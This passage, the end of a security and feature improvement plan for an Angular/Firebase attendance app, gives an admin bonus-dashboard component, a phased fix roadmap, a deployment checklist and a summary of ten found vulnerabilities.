        this.bonusStatus = await this.bonusService.getUserBonusStatus(profile.uid);
      }
    });
  }
}
```

### 5.4 Updated Admin Bonus View

**File to Update**: [src/app/features/admin/admin.ts](src/app/features/admin/admin.ts)

```typescript
// admin.ts - UPDATED COMPONENT

import { Component, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { BonusService, BonusRecord } from '../../core/services/bonus.service';

@Component({
  selector: 'app-admin',
  standalone: true,
  imports: [CommonModule],
  template: `
    <div class="admin-container">
      <h1>Bonus Eligibility Dashboard</h1>
      
      <div class="filter-section">
        <button (click)="sortBy('currentBonus')" 
                [class.active]="sortMethod === 'currentBonus'">
          Sort by Eligibility
        </button>
        <button (click)="sortBy('presentDays')" 
                [class.active]="sortMethod === 'presentDays'">
          Sort by Days Completed
        </button>
      </div>

      <div class="summary-cards">
        <div class="summary-card full">
          <span class="count">{{ fullBonusCount }}</span>
          <span class="label">Full Bonus (240+)</span>
        </div>
        <div class="summary-card half">
          <span class="count">{{ halfBonusCount }}</span>
          <span class="label">Half Bonus (200+)</span>
        </div>
        <div class="summary-card none">
          <span class="count">{{ noBonusCount }}</span>
          <span class="label">No Bonus</span>
        </div>
      </div>

      <div class="table-container">
        <table class="bonus-table">
          <thead>
            <tr>
              <th>Employee</th>
              <th>Attendance Days</th>
              <th>Half Bonus (200)</th>
              <th>Full Bonus (240)</th>
              <th>Current Status</th>
            </tr>
          </thead>
          <tbody>
            <tr *ngFor="let emp of sortedEmployees" [ngClass]="'status-' + emp.currentBonus">
              <td class="employee-name">{{ getEmployeeName(emp.uid) }}</td>
              <td class="days">{{ emp.presentDays }}</td>
              <td class="tier-cell">
                <span class="tier-badge" [ngClass]="{ achieved: emp.halfBonusEligible }">
                  {{ emp.halfBonusEligible ? '✓' : emp.daysUntilHalfBonus }}
                </span>
              </td>
              <td class="tier-cell">
                <span class="tier-badge" [ngClass]="{ achieved: emp.fullBonusEligible }">
                  {{ emp.fullBonusEligible ? '✓' : emp.daysUntilFullBonus }}
                </span>
              </td>
              <td class="status">
                <span class="status-badge" [ngClass]="'status-' + emp.currentBonus">
                  {{ emp.currentBonus | titlecase }}
                </span>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
  `,
  styles: [`
    .admin-container {
      padding: 20px;
      max-width: 1400px;
      margin: 0 auto;
    }

    .filter-section {
      margin: 20px 0;
      display: flex;
      gap: 10px;

      button {
        padding: 10px 20px;
        border: 1px solid #ddd;
        border-radius: 4px;
        background: white;
        cursor: pointer;
        transition: all 0.3s;

        &.active {
          background: #2196F3;
          color: white;
          border-color: #2196F3;
        }
      }
    }

    .summary-cards {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 15px;
      margin: 20px 0;
    }

    .summary-card {
      padding: 20px;
      border-radius: 8px;
      color: white;
      text-align: center;

      .count {
        display: block;
        font-size: 32px;
        font-weight: bold;
        margin-bottom: 5px;
      }

      .label {
        font-size: 14px;
        opacity: 0.9;
      }

      &.full {
        background: linear-gradient(135deg, #4CAF50, #45a049);
      }

      &.half {
        background: linear-gradient(135deg, #FF9800, #fb8c00);
      }

      &.none {
        background: linear-gradient(135deg, #f44336, #da190b);
      }
    }

    .table-container {
      overflow-x: auto;
      margin-top: 20px;
    }

    .bonus-table {
      width: 100%;
      border-collapse: collapse;
      background: white;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);

      th {
        background: #f5f5f5;
        padding: 15px;
        text-align: left;
        font-weight: 600;
        color: #333;
        border-bottom: 2px solid #ddd;
      }

      td {
        padding: 12px 15px;
        border-bottom: 1px solid #eee;
      }

      tbody tr {
        transition: background 0.3s;

        &:hover {
          background: #f9f9f9;
        }

        &.status-full {
          border-left: 4px solid #4CAF50;
        }

        &.status-half {
          border-left: 4px solid #FF9800;
        }

        &.status-none {
          border-left: 4px solid #f44336;
        }
      }

      .employee-name {
        font-weight: 600;
        color: #333;
      }

      .days {
        font-size: 18px;
        font-weight: bold;
        color: #2196F3;
      }

      .tier-cell {
        text-align: center;
      }

      .tier-badge {
        display: inline-block;
        padding: 4px 12px;
        background: #f0f0f0;
        border-radius: 20px;
        font-size: 12px;
        font-weight: 600;
        color: #666;

        &.achieved {
          background: #d4edda;
          color: #155724;
        }
      }

      .status-badge {
        display: inline-block;
        padding: 6px 16px;
        border-radius: 20px;
        font-size: 12px;
        font-weight: 600;
        color: white;

        &.status-full {
          background: #4CAF50;
        }

        &.status-half {
          background: #FF9800;
        }

        &.status-none {
          background: #f44336;
        }
      }
    }
  `]
})
export class AdminComponent implements OnInit {
  sortedEmployees: any[] = [];
  sortMethod: 'currentBonus' | 'presentDays' = 'presentDays';
  
  fullBonusCount = 0;
  halfBonusCount = 0;
  noBonusCount = 0;

  constructor(private bonusService: BonusService) {}

  async ngOnInit() {
    await this.loadBonusData();
  }

  async loadBonusData() {
    const bonusMap = await this.bonusService.getEmployeeBonusLeaderboard(this.sortMethod);
    this.sortedEmployees = bonusMap;
    this.calculateSummary();
  }

  calculateSummary() {
    this.fullBonusCount = this.sortedEmployees.filter(e => e.currentBonus === 'full').length;
    this.halfBonusCount = this.sortedEmployees.filter(e => e.currentBonus === 'half').length;
    this.noBonusCount = this.sortedEmployees.filter(e => e.currentBonus === 'none').length;
  }

  async sortBy(method: 'currentBonus' | 'presentDays') {
    this.sortMethod = method;
    await this.loadBonusData();
  }

  getEmployeeName(uid: string): string {
    // Fetch from user service
    return 'Employee Name';
  }
}
```

---

## Part 6: COMPREHENSIVE IMPLEMENTATION ROADMAP

### Phase 1: CRITICAL FIXES (Week 1)
**Priority**: Must complete before production

- [ ] **P0-1**: Remove hardcoded master login
- [ ] **P0-2**: Move Firebase credentials to environment variables
- [ ] **P0-3**: Add admin role verification to Cloud Functions
- [ ] **P1-1**: Add input validation to Cloud Functions
- [ ] **P1-2**: Update Firebase rules for settings
- [ ] **P1-3**: Implement leave approval workflow

### Phase 2: SECURITY ENHANCEMENTS (Week 2)
**Priority**: Important for enterprise deployment

- [ ] **P1-4**: Implement rate limiting
- [ ] **P2-1**: Add role field validation
- [ ] **P2-2**: Implement admin action audit logging
- [ ] **P2-3**: Add brute force protection
- [ ] Update Firebase security rules comprehensively
- [ ] Add CORS headers to Cloud Functions

### Phase 3: FEATURE ENHANCEMENT (Week 3)
**Priority**: Business requirement

- [ ] Update bonus calculation logic (200/240 tiers)
- [ ] Update dashboard UI for bonus progress
- [ ] Update admin bonus view
- [ ] Test all attendance calculations
- [ ] Update documentation

### Phase 4: TESTING & DEPLOYMENT (Week 4)
**Priority**: Quality assurance

- [ ] Unit tests for bonus calculations
- [ ] Integration tests for authentication
- [ ] Security penetration testing
- [ ] Load testing for rate limiting
- [ ] User acceptance testing
- [ ] Deploy to staging
- [ ] Deploy to production with rollback plan

---

## Part 7: DEPLOYMENT CHECKLIST

### Before Production:
- [ ] All P0 vulnerabilities fixed
- [ ] Firebase rules tested and validated
- [ ] Environment variables configured
- [ ] Admin user created via Firebase Console (not hardcoded)
- [ ] Backup strategy implemented
- [ ] Monitoring and alerting configured
- [ ] Audit logging enabled
- [ ] Rate limiting tested under load
- [ ] HTTPS enforced everywhere
- [ ] Security headers configured

### Post-Deployment:
- [ ] Monitor error logs for security issues
- [ ] Review audit logs weekly
- [ ] Update security rules quarterly
- [ ] Run penetration testing annually
- [ ] Update dependencies for security patches

---

## Part 8: LONG-TERM RECOMMENDATIONS

### Architecture Improvements:
1. **Implement API Gateway**: Add authentication middleware
2. **Database Sharding**: Scale attendance data by employee
3. **Caching Strategy**: Cache bonus calculations (expensive operation)
4. **Event-Driven Architecture**: Use Pub/Sub for notifications
5. **Microservices**: Separate auth, attendance, bonus, leave services

### Monitoring & Observability:
1. **Structured Logging**: Use Cloud Logging with severity levels
2. **Error Tracking**: Implement Sentry/Rollbar
3. **Performance Monitoring**: Track Cloud Function execution times
4. **Security Monitoring**: Alert on failed login attempts, role changes
5. **Usage Analytics**: Track API call patterns

### Compliance & Best Practices:
1. **Data Encryption**: Encrypt sensitive fields at rest
2. **Backup Strategy**: Daily backups with encryption
3. **Disaster Recovery**: RTO < 4 hours, RPO < 1 hour
4. **Documentation**: Keep security docs up to date
5. **Training**: Annual security training for developers

---

## Summary

**Total Vulnerabilities Found**: 10
- **Critical (P0)**: 3
- **High (P1)**: 4
- **Medium (P2)**: 3

**Estimated Effort**:
- Security Fixes: 3-5 days
- Feature Enhancement: 2-3 days
- Testing & Deployment: 2-3 days

**Risk Without Fixes**: 🔴 **HIGH** - System is exploitable in current state

**Timeline to Production-Ready**: 2-3 weeks with full team

---

**End of Security & Feature Improvement Plan**
